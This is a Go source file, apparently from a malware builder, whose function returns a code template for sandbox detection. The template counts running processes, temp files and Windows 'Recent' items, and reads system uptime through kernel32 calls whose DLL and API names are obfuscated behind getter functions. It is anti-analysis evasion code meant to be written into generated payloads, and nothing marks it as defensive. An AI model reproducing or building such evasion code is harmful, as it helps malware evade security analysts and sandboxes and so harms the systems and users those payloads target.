package buildergen

import "strings"

func templateSandboxCheck() string {
	return strings.TrimSpace(`
func isSandboxEnvironment() bool {
	if getProcessCount() < 50 {
		return true
	}

	tempFiles, _ := os.ReadDir(os.TempDir())
	if len(tempFiles) < 10 {
		return true
	}

	recentDir := filepath.Join(os.Getenv(getAppDataEnvName()), getMicrosoftDirName(), getWindowsDirName(), "Recent")
	recentFiles, _ := os.ReadDir(recentDir)
	if len(recentFiles) < 5 {
		return true
	}

	return false
}

func getSystemUptime() int64 {
	kernel32 := syscall.NewLazyDLL(getKernel32DLL())
	getTickCount64 := kernel32.NewProc(getGetTickCount64Name())
	ret, _, _ := getTickCount64.Call()
	return int64(ret) / 1000
}

func getProcessCount() int {
	kernel32 := syscall.NewLazyDLL(getKernel32DLL())
	snapshot := kernel32.NewProc(getCreateToolhelp32SnapshotName())
	processNext := kernel32.NewProc(getProcess32NextWName())
	closeHandle := kernel32.NewProc(getCloseHandleName())

	h, _, _ := snapshot.Call(0x00000002, 0)
	if h == 0 {
		return 0
	}
	defer closeHandle.Call(h)

	count := 0
	var pe32 [568]byte
	*(*uint32)(unsafe.Pointer(&pe32[0])) = 568

	for {
		ret, _, _ := processNext.Call(h, uintptr(unsafe.Pointer(&pe32[0])))
		if ret == 0 {
			break
		}
		count++
	}
	return count
}
`)
}
